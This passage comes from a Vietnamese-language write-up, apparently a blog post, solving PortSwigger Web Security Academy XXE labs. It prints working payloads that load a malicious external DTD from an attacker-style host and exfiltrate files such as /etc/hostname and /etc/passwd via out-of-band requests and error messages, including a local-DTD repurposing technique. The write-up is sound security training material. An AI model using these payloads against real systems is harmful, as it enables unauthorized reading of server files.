+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_server1.png?raw=true" alt="img"></p>
+<p>Sau đó sent payload vào exploit server:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_server2.png?raw=true" alt="img"></p>
+<p>Vậy là chúng ta đã chuẩn bị xong 1 malicious DTD, tiếp theo tới việc dùng nó để extract data sáng client của chúng ta :vv</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+&#34;http://web-attacker.com/malicious.dtd&#34;&gt; %xxe;]&gt;
+
+==&gt;
+
+
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-ac541f241fc9ab3380d418b3013f00d0.web-security-academy.net/exploit.dtd&#34;&gt; %xxe;]&gt;
+
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_request2.png?raw=true" alt="img"></p>
+<p>Sau đó chèn vào request và tấn công như hình thức cơ bản, tiếp theo truy cập Burp Collaboration poll data về và chúng ta sẽ có được giá trị của /etc/hostname</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_poll.png?raw=true" alt="img">
+Vào check data phần có giao thức HTTP chúng ta thấy được giá trị của file chúng ta cần :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_submit.png?raw=true" alt="img">
+<img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">Lab: Exploiting blind XXE to retrieve data via error messages</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input but does not display the result.
+
+To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
+
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+</code></pre></div><p>Bài lab đã mô tả rằng chúng ta phải khai thác vào phần kích hoạt lỗi của website&gt; Một cách tiếp cận khác để khai thác XXE mù là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn truy xuất. Điều này sẽ có hiệu lực nếu ứng dụng trả về thông báo lỗi kết quả trong phản hồi của nó.</p>
+<p>Dựa vào đó chúng ta làm tương tự như bài lab trên, tuy nhiên phần client sẽ là 1 client không tồn tại = &gt; điều này sẽ dẫn đến lỗi được kích hoạt và tin nhắn lỗi trả về cũng giá
+trị file mà mình mong muốn.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_erromsg_request.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfil;
+
+
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-acfb1fdd1e72c07780708c0d01210056.web-security-academy.net/exploit.dtd&#34;&gt; %xxe;]&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_erromsg_exploitserver.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_erromsg_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd">Lab: Exploiting XXE to retrieve data by repurposing a local DTD</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input but does not display the result.
+
+To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
+
+You&#39;ll need to reference an existing DTD file on the server and redefine an entity from it.
+</code></pre></div><p>Bài lab mô tả rằng chúng ta sẽ kích hoạt lỗi và trả về file passwd, tuy nhiên lần này chúng ta không tự viết file malicious DTD nữa mà sẽ sử dụng file có sẳn trên hệ thống.</p>
+<p>Vì cuộc tấn công XXE này liên quan đến việc định vị lại một DTD hiện có trên hệ thống tệp máy chủ, yêu cầu chính là xác định vị trí tệp phù hợp. Điều này thực sự khá đơn giản. Vì
+ứng dụng trả về bất kỳ thông báo lỗi nào do trình phân tích cú pháp XML ném ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách cố gắng tải chúng từ bên trong DTD nội
+bộ.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_local_request.png?raw=true" alt="img"></p>
+<p>Chúng ta có thể kiểm tra thử xem file DTD có tồn tại hay không bằng cách chuyển payload này vào request và xem thử :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+%local_dtd;
+]&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_local_check.png?raw=true" alt="img"></p>
+<p>Sau khi xác định được file DTD cần thiết chúng ta tiến hành exploit. Đối với kỹ thuật trước chúng ta chỉ có thể áp dụng với file malicious phía bên ngoài, lần này chúng ta khai thác bằng file local nên sẽ khác. CHúng ta dựa trên format sau để tạo payload phù hợp khi đã xác định được file DTD local:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/local/app/schema.dtd&#34;&gt;
+&lt;!ENTITY % custom_entity &#39;
+&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+&#39;&gt;
+%local_dtd;
+]&gt;
+
+This DTD carries out the following steps:
+
+ + Defines an XML parameter entity called local_dtd, containing the contents of the external DTD 
+file that exists on the server filesystem.
+ + Redefines the XML parameter entity called custom_entity, which is already defined in the external
+DTD file. The entity is redefined as containing the error-based XXE exploit that was already described,
+for triggering an error message containing the contents of the /etc/passwd file.
+ + Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of
+the custom_entity entity. This results in the desired error message.
+
+</code></pre></div><p>Từ format trên chúng ta có thể suy ra được payload cần thiết như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE message [
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+&lt;!ENTITY % ISOamso &#39;
+&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///hellomotherfucker/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+&#39;&gt;
+%local_dtd;
+]&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_local_catfile.png?raw=true" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
